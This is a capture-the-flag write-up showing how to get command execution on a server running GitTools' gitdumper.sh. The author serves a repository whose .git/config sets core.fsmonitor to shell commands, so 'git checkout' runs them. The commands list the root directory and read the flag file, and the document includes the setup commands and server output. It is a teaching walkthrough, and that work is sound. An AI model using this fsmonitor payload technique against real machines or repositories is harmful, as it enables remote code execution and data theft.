# Git To the Core
```
Cloning git repositories from web servers might be risky. Can you show me why?

With <3 from @gehaxelt
nc 52.59.124.14 10001 
```

Connecting with netcat and entering a sample URL gives us the following output:
```
└─$ nc 52.59.124.14 10001 
Challenge was created with <3 by @gehaxelt.
Let's dump a .git/ repository from a web server of your choice. Please provide an URL: http://google.com
Running command:  /opt/GitTools/Dumper/gitdumper.sh http://google.com ./repo
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[-] /.git/ missing in url


Failed to clone the repository!
```

The script's source code can be found [here](https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh) and there's only 2 possible vulnerabilities I could find due to everything else checking for correctly formatted hashes:
- We're able to control the --git-dir argument (by having it in a query string like `? --git-dir [path] [stuff to match the ends with git-dir condition]`, though this requires a custom web server serve files correctly based on contents of query string if we want to use this) and thus we can choose in which directory we will write the git files
- We're able to control `.git/config`, allowing us to set `core.fsmonitor` to any shell command. Conveniently, after dumping the .git directory the script will run `git checkout .` triggering the `core.fsmonitor` command. The vulnerability of this challenge seems now pretty clear.

We can setup a local web server with `ngrok` and python's http.server module:
```
└─$ ngrok --scheme http http 80
└─$ python3 -m http.server 80
```

Setup the actual payload:
```
└─$ git init
└─$ touch a
└─$ git add .
└─$ git commit -m "hello world"
└─$ cat <<EOL > .git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
        fsmonitor = "echo \"\$(ls /)\">&2;false"
EOL
```

And then execute it on the remote:
```
└─$ nc 52.59.124.14 10001 
Challenge was created with <3 by @gehaxelt.
Let's dump a .git/ repository from a web server of your choice. Please provide an URL: http://9f52c69a5d6f.eu.ngrok.io/.git/
Running command:  /opt/GitTools/Dumper/gitdumper.sh http://9f52c69a5d6f.eu.ngrok.io/.git/ ./repo
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating ./repo/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/72/c649d6545980d04539e40356cc4856581ffbbe
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/49/6d6428b9cf92981dc9495211e6e1120fb6f2ba
[+] Downloaded: objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391


Running git checkout:  git checkout .

FLAG
app
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
FLAG
app
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
warning: unable to access '/root/.config/git/attributes': Permission denied
Updated 1 path from the index

└─$ cat <<EOL > .git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
        fsmonitor = "echo \"\$(cat /FLAG)\">&2;false"
EOL

└─$ nc 52.59.124.14 10001
Challenge was created with <3 by @gehaxelt.
Let's dump a .git/ repository from a web server of your choice. Please provide an URL: http://9f52c69a5d6f.eu.ngrok.io/.git/
Running command:  /opt/GitTools/Dumper/gitdumper.sh http://9f52c69a5d6f.eu.ngrok.io/.git/ ./repo
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating ./repo/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/72/c649d6545980d04539e40356cc4856581ffbbe
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/49/6d6428b9cf92981dc9495211e6e1120fb6f2ba
[+] Downloaded: objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391


Running git checkout:  git checkout .

ENO{G1T_1S_FUn_T0_H4cK}
ENO{G1T_1S_FUn_T0_H4cK}
warning: unable to access '/root/.config/git/attributes': Permission denied
Updated 1 path from the index
```

Flag: `ENO{G1T_1S_FUn_T0_H4cK}`